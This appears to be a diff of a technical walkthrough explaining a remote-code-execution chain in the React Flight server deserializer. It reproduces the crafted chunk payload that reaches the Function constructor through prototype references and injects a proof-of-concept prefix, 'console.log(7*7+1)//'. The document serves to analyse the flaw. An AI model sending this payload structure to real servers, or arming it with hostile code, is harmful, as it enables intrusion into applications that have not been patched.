@@ -86,7 +86,7 @@ boundActionArguments = response._chunks[0]
 
 ---
 
-## Step 2: Chunk 0 Resolves → References Chunk 1
+## Step 2: Chunk 0 is Awaited → Blocks on Chunk 1
 
 ### BEFORE
 
@@ -94,7 +94,7 @@ boundActionArguments = response._chunks[0]
 response._chunks = {
     0: {
         status: "resolved_model",
-        value: "$1",                    // <-- Currently resolving this
+        value: "$1",                    // <-- Needs to resolve this
         reason: null,
         _response: response
     },
@@ -123,48 +123,59 @@ response._chunks = {
         _response: response
     }
 }
+
+// Server code does:
+await boundActionArguments  // boundActionArguments = chunk 0
 ```
 
 ### CODE
 
 ```javascript
-// ReactFlightReplyServer.js - parseModelString
+// JavaScript sees chunk 0 is a thenable (has Chunk.prototype.then)
+// It calls: chunk0.then(resolve, reject)
+
+Chunk.prototype.then = function(resolve, reject) {
+    const chunk = this;  // chunk = chunk 0
+
+    switch (chunk.status) {
+        case "resolved_model":
+            initializeModelChunk(chunk);  // Try to parse "$1"
+            break;
+    }
+    // ...
+};
+
+// initializeModelChunk calls parseModelString on "$1"
 function parseModelString(response, parentObject, key, value) {
     // value = "$1"
-
-    if (value[0] !== '$') return value;
-
-    // value[0] = '$', so it's a reference
-    // value[1] = '1', which is not a special character
-
-    switch (value[1]) {
-        default: {
-            // Parse "1" as hexadecimal chunk ID
-            const refId = parseInt(value.slice(1), 16);  // refId = 1
-            return getOrResolveChunk(response, refId);   // Returns chunk 1
-        }
+    if (value[0] === '$') {
+        const refId = parseInt(value.slice(1), 16);  // refId = 1
+        return getOrResolveChunk(response, refId);   // Needs chunk 1's VALUE
     }
 }
+
+// But chunk 1 is still "resolved_model" (not initialized)!
+// So chunk 0 must BLOCK and wait for chunk 1 to resolve first
 ```
 
 ### Explanation
 
-The value `"$1"` is a chunk reference. The `$` indicates it's a reference, and `1` is the chunk ID (in hex). The function returns chunk 1, which will need to be resolved next.
+When chunk 0 is awaited, `Chunk.prototype.then` is called. It tries to resolve `"$1"` but chunk 1 isn't initialized yet. Chunk 0 becomes `blocked` and registers a callback on chunk 1 so it gets notified when chunk 1 resolves.
 
 ### AFTER
 
 ```javascript
 response._chunks = {
     0: {
-        status: "initialized",
-        value: response._chunks[1],     // <-- Now points to chunk 1 object
+        status: "blocked",              // <-- Blocked waiting on chunk 1!
+        value: null,
         reason: null,
         _response: response
     },
     1: {
         status: "resolved_model",
         value: '{"status":"resolved_model","reason":0,"_response":"$4","value":"{\\"then\\":\\"$3:map\\",\\"0\\":{\\"then\\":\\"$B3\\"},\\"length\\":1}","then":"$2:then"}',
-        reason: null,
+        reason: [chunk0_callback],      // <-- Callback to wake up chunk 0!
         _response: response
     },
     2: {
@@ -186,26 +197,28 @@ response._chunks = {
         _response: response
     }
 }
+
+// Now chunk 1 needs to be resolved before chunk 0 can continue
 ```
 
 ---
 
-## Step 3: Chunk 3 Resolves → Empty Array
+## Step 3: Chunk 3 Resolves → Empty Array (No Dependencies)
 
 ### BEFORE
 
 ```javascript
 response._chunks = {
     0: {
-        status: "initialized",
-        value: response._chunks[1],
+        status: "blocked",              // Still blocked on chunk 1
+        value: null,
         reason: null,
         _response: response
     },
     1: {
         status: "resolved_model",
         value: '{"status":"resolved_model","reason":0,"_response":"$4","value":"{\\"then\\":\\"$3:map\\",\\"0\\":{\\"then\\":\\"$B3\\"},\\"length\\":1}","then":"$2:then"}',
-        reason: null,
+        reason: [chunk0_callback],
         _response: response
     },
     2: {
@@ -216,7 +229,7 @@ response._chunks = {
     },
     3: {
         status: "resolved_model",
-        value: "[]",                    // <-- Currently resolving this
+        value: "[]",                    // <-- Resolving this first (no dependencies!)
         reason: null,
         _response: response
     },
@@ -232,32 +245,32 @@ response._chunks = {
 ### CODE
 
 ```javascript
-// The value "[]" is valid JSON, so it gets parsed
+// The value "[]" is valid JSON with no $ references
 const parsed = JSON.parse("[]");  // Returns: []
 
-// Chunk 3 is updated
+// No dependencies to wait on, so chunk 3 can initialize immediately
 chunk3.value = [];
 chunk3.status = "initialized";
 ```
 
 ### Explanation
 
-The string `"[]"` is valid JSON representing an empty array. After parsing, chunk 3 holds an actual JavaScript array. This array is critical because it provides access to the prototype chain.
+The string `"[]"` is valid JSON representing an empty array. It has NO `$` references, so it can resolve immediately without blocking. This array is critical because it provides access to the prototype chain.
 
 ### AFTER
 
 ```javascript
 response._chunks = {
     0: {
-        status: "initialized",
-        value: response._chunks[1],
+        status: "blocked",
+        value: null,
         reason: null,
         _response: response
     },
     1: {
         status: "resolved_model",
         value: '{"status":"resolved_model","reason":0,"_response":"$4","value":"{\\"then\\":\\"$3:map\\",\\"0\\":{\\"then\\":\\"$B3\\"},\\"length\\":1}","then":"$2:then"}',
-        reason: null,
+        reason: [chunk0_callback],
         _response: response
     },
     2: {
@@ -267,8 +280,8 @@ response._chunks = {
         _response: response
     },
     3: {
-        status: "initialized",          // <-- Changed from "resolved_model"
-        value: [],                      // <-- Now an actual empty array!
+        status: "initialized",          // <-- Now fully resolved!
+        value: [],                      // <-- Actual empty array
         reason: null,
         _response: response
     },
@@ -294,15 +307,15 @@ response._chunks = {
 ```javascript
 response._chunks = {
     0: {
-        status: "initialized",
-        value: response._chunks[1],
+        status: "blocked",
+        value: null,
         reason: null,
         _response: response
     },
     1: {
         status: "resolved_model",
         value: '{"status":"resolved_model","reason":0,"_response":"$4","value":"{\\"then\\":\\"$3:map\\",\\"0\\":{\\"then\\":\\"$B3\\"},\\"length\\":1}","then":"$2:then"}',
-        reason: null,
+        reason: [chunk0_callback],
         _response: response
     },
     2: {
@@ -320,7 +333,7 @@ response._chunks = {
     4: {
         status: "resolved_model",
         value: '{"_prefix":"console.log(7*7+1)//","_formData":{"get":"$3:constructor:constructor"},"_chunks":"$2:_response:_chunks"}',
-        reason: null,                   // Resolving the "get" property ^^^
+        reason: null,                   // <-- Resolving "get" property which needs chunk 3
         _response: response
     }
 }
@@ -365,15 +378,15 @@ The code has no validation, so it happily traverses the prototype chain.
 ```javascript
 response._chunks = {
     0: {
-        status: "initialized",
-        value: response._chunks[1],
+        status: "blocked",
+        value: null,
         reason: null,
         _response: response
     },
     1: {
         status: "resolved_model",
         value: '{"status":"resolved_model","reason":0,"_response":"$4","value":"{\\"then\\":\\"$3:map\\",\\"0\\":{\\"then\\":\\"$B3\\"},\\"length\\":1}","then":"$2:then"}',
-        reason: null,
+        reason: [chunk0_callback],
         _response: response
     },
     2: {
@@ -389,7 +402,7 @@ response._chunks = {
         _response: response
     },
     4: {
-        status: "initialized",          // <-- Changed from "resolved_model"
+        status: "initialized",          // <-- Now resolved!
         value: {
             _prefix: "console.log(7*7+1)//",
             _formData: {
@@ -412,20 +425,20 @@ response._chunks = {
 ```javascript
 response._chunks = {
     0: {
-        status: "initialized",
-        value: response._chunks[1],
+        status: "blocked",
+        value: null,
         reason: null,
         _response: response
     },
     1: {
         status: "resolved_model",
         value: '{"status":"resolved_model","reason":0,"_response":"$4","value":"{\\"then\\":\\"$3:map\\",\\"0\\":{\\"then\\":\\"$B3\\"},\\"length\\":1}","then":"$2:then"}',
-        reason: null,
+        reason: [chunk0_callback],
         _response: response
     },
     2: {
         status: "resolved_model",
-        value: "$@3",                   // <-- Currently resolving this
+        value: "$@3",                   // <-- Resolving this
         reason: null,
         _response: response
     },
@@ -477,20 +490,20 @@ The `$@` prefix is special. Unlike `$3` which would return the resolved value (`
 ```javascript
 response._chunks = {
     0: {
-        status: "initialized",
-        value: response._chunks[1],
+        status: "blocked",
+        value: null,
         reason: null,
         _response: response
     },
     1: {
         status: "resolved_model",
         value: '{"status":"resolved_model","reason":0,"_response":"$4","value":"{\\"then\\":\\"$3:map\\",\\"0\\":{\\"then\\":\\"$B3\\"},\\"length\\":1}","then":"$2:then"}',
-        reason: null,
+        reason: [chunk0_callback],
         _response: response
     },
     2: {
-        status: "initialized",          // <-- Changed from "resolved_model"
-        value: {                        // <-- Now holds the Chunk OBJECT for chunk 3
+        status: "initialized",          // <-- Now resolved!
+        value: {                        // <-- Holds the Chunk OBJECT for chunk 3
             status: "initialized",
             value: [],
             reason: null,
@@ -531,15 +544,15 @@ response._chunks = {
 ```javascript
 response._chunks = {
     0: {
-        status: "initialized",
-        value: response._chunks[1],
+        status: "blocked",
+        value: null,
         reason: null,
         _response: response
     },
     1: {
         status: "resolved_model",
         value: '{"status":"resolved_model","reason":0,"_response":"$4","value":"{\\"then\\":\\"$3:map\\",\\"0\\":{\\"then\\":\\"$B3\\"},\\"length\\":1}","then":"$2:then"}',
-        reason: null,                   // Resolving the "then" property ^^^
+        reason: [chunk0_callback],      // <-- Resolving "then" property which needs chunk 2
         _response: response
     },
     2: {
@@ -605,21 +618,25 @@ We access the `then` property of chunk 2's value. Since chunk 2 holds a raw Chun
 ```javascript
 response._chunks = {
     0: {
-        status: "initialized",
-        value: response._chunks[1],
+        status: "blocked",
+        value: null,
         reason: null,
         _response: response
     },
     1: {
-        status: "initialized",          // <-- Changed from "resolved_model"
-        value: {                        // <-- Now a parsed object
+        status: "initialized",          // <-- Now resolved!
+        value: {                        // <-- The attacker's fake Chunk object
             status: "resolved_model",
             reason: 0,
-            _response: "$4",            // Still needs resolution
+            _response: {                // <-- Resolved to chunk 4's value!
+                _prefix: "console.log(7*7+1)//",
+                _formData: { get: Function },
+                _chunks: response._chunks
+            },
             value: '{"then":"$3:map","0":{"then":"$B3"},"length":1}',
-            then: function(resolve, reject) { /* Chunk.prototype.then */ }  // <-- GOT IT!
+            then: function(resolve, reject) { /* Chunk.prototype.then */ }  // <-- STOLEN!
         },
-        reason: null,
+        reason: null,                   // Callbacks cleared after calling them
         _response: response
     },
     2: {
@@ -647,25 +664,28 @@ response._chunks = {
             _formData: {
                 get: Function
             },
-            _chunks: "$2:_response:_chunks"
+            _chunks: response._chunks
         },
         reason: null,
         _response: response
     }
 }
+
+// Chunk 1 resolved! Now it calls the callbacks in its reason array
+// This wakes up chunk 0!
 ```
 
 ---
 
-## Step 7: Resolving `$4` → Gets Fake Response
+## Step 7: Chunk 0 Unblocks → Gets Chunk 1's Value
 
 ### BEFORE
 
 ```javascript
 response._chunks = {
     0: {
-        status: "initialized",
-        value: response._chunks[1],
+        status: "blocked",              // <-- Still blocked, waiting on chunk 1
+        value: null,
         reason: null,
         _response: response
     },
@@ -674,65 +694,58 @@ response._chunks = {
         value: {
             status: "resolved_model",
             reason: 0,
-            _response: "$4",            // <-- Currently resolving this
+            _response: {
+                _prefix: "console.log(7*7+1)//",
+                _formData: { get: Function },
+                _chunks: response._chunks
+            },
             value: '{"then":"$3:map","0":{"then":"$B3"},"length":1}',
             then: function(resolve, reject) { /* Chunk.prototype.then */ }
         },
         reason: null,
         _response: response
     },
-    2: {
-        status: "initialized",
-        value: {
-            status: "initialized",
-            value: [],
-            reason: null,
-            _response: response,
-            then: function(resolve, reject) { /* Chunk.prototype.then */ }
-        },
-        reason: null,
-        _response: response
-    },
-    3: {
-        status: "initialized",
-        value: [],
-        reason: null,
-        _response: response
-    },
-    4: {
-        status: "initialized",
-        value: {
-            _prefix: "console.log(7*7+1)//",
-            _formData: {
-                get: Function
-            },
-            _chunks: "$2:_response:_chunks"
-        },
-        reason: null,
-        _response: response
-    }
+    // ... chunks 2, 3, 4 all initialized ...
 }
+
+// Chunk 1 just resolved - now it calls the callback to wake up chunk 0
 ```
 
 ### CODE
 
 ```javascript
-// parseModelString processes "$4"
-const refId = parseInt("4", 16);  // refId = 4
-return getOrResolveChunk(response, refId);  // Returns chunk 4's value
+// When chunk 1 resolved, it called chunk0_callback
+// This callback sets chunk 0's value to chunk 1's value
+
+chunk0.status = "initialized";
+chunk0.value = chunk1.value;  // The attacker's fake Chunk object!
+
+// The await on chunk 0 now completes, returning chunk 0's value
+// JavaScript sees this value has a "then" property that is a function
+// IT'S A THENABLE!
 ```
 
 ### Explanation
 
-The `_response` property resolves to chunk 4's value - the attacker's fake Response object containing the malicious code prefix and the Function constructor.
+Chunk 1's resolution triggers the callback registered in Step 2. Chunk 0 unblocks and its value becomes chunk 1's value - the attacker's fake Chunk object with `then: Chunk.prototype.then`. When JavaScript resolves this thenable, it calls the `then` function!
 
 ### AFTER
 
 ```javascript
 response._chunks = {
     0: {
-        status: "initialized",
-        value: response._chunks[1],
+        status: "initialized",          // <-- Finally resolved!
+        value: {                        // <-- Same as chunk 1's value
+            status: "resolved_model",
+            reason: 0,
+            _response: {
+                _prefix: "console.log(7*7+1)//",
+                _formData: { get: Function },
+                _chunks: response._chunks
+            },
+            value: '{"then":"$3:map","0":{"then":"$B3"},"length":1}',
+            then: function(resolve, reject) { /* Chunk.prototype.then */ }
+        },
         reason: null,
         _response: response
     },
@@ -741,12 +754,10 @@ response._chunks = {
         value: {
             status: "resolved_model",
             reason: 0,
-            _response: {                // <-- Resolved to chunk 4's value!
+            _response: {
                 _prefix: "console.log(7*7+1)//",
-                _formData: {
-                    get: Function
-                },
-                _chunks: "$2:_response:_chunks"
+                _formData: { get: Function },
+                _chunks: response._chunks
             },
             value: '{"then":"$3:map","0":{"then":"$B3"},"length":1}',
             then: function(resolve, reject) { /* Chunk.prototype.then */ }
@@ -779,14 +790,15 @@ response._chunks = {
             _formData: {
                 get: Function
             },
-            _chunks: "$2:_response:_chunks"
+            _chunks: response._chunks
         },
         reason: null,
         _response: response
     }
 }
 
-// Chunk 1's value is now complete and is a THENABLE (has "then" function)
+// Chunk 0's value is a THENABLE (has "then" function)
+// JavaScript will now call chunk0.value.then(resolve, reject)!
 ```
 
 ---
@@ -852,7 +864,7 @@ chunk = {
         _formData: {
             get: Function
         },
-        _chunks: "$2:_response:_chunks"
+        _chunks: response._chunks        // Points to real chunks!
     },
     value: '{"then":"$3:map","0":{"then":"$B3"},"length":1}'
 }
@@ -876,7 +888,7 @@ chunk = {
         _formData: {
             get: Function
         },
-        _chunks: "$2:_response:_chunks"
+        _chunks: response._chunks        // Points to real chunks!
     },
     value: '{"then":"$3:map","0":{"then":"$B3"},"length":1}'
 }
@@ -930,7 +942,7 @@ fakeResponse = {
     _formData: {
         get: Function
     },
-    _chunks: "$2:_response:_chunks"
+    _chunks: response._chunks    // Points to real chunks!
 }
 ```
 
@@ -1076,7 +1088,7 @@ fakeResponse = {
     _formData: {
         get: Function         // The Function constructor!
     },
-    _chunks: "$2:_response:_chunks"
+    _chunks: response._chunks // Points to real chunks!
 }
 ```
 
@@ -1257,17 +1269,33 @@ response._chunks = {
 ```
 HTTP Request with malicious form fields
     ↓
-decodeReplyFromBusboy() stores chunks 0-4
+decodeReplyFromBusboy() stores chunks 0-4 (all status: "resolved_model")
     ↓
-Returns chunk 0 (points to chunk 1)
+Returns chunk 0 (thenable - has Chunk.prototype.then)
     ↓
-await chunk1 (which has "then" = Chunk.prototype.then)
+await chunk 0 → calls Chunk.prototype.then
     ↓
-JavaScript calls chunk1.then(resolve, reject)
+Chunk 0 needs chunk 1's VALUE → becomes BLOCKED
+    ↓
+Registers callback on chunk 1 to wake up chunk 0
+    ↓
+Dependency resolution begins (bottom-up):
+    - Chunk 3 resolves first (no deps) → []
+    - Chunk 2 resolves ($@3) → raw Chunk object with .then
+    - Chunk 4 resolves ($3:constructor:constructor) → { get: Function }
+    - Chunk 1 resolves → fake Chunk with stolen Chunk.prototype.then
+    ↓
+Chunk 1 resolved → calls chunk 0's callback
+    ↓
+Chunk 0 unblocks → value = chunk 1's value (fake Chunk object)
+    ↓
+await returns fake Chunk object (has "then" function)
+    ↓
+JavaScript sees thenable → calls fakeChunk.then(resolve, reject)
     ↓
 Chunk.prototype.then sees status = "resolved_model"
     ↓
-Calls initializeModelChunk(chunk1) with chunk1._response = FAKE
+Calls initializeModelChunk with FAKE _response!
     ↓
 Parses nested JSON: { then: "$3:map", 0: { then: "$B3" }, length: 1 }
     ↓
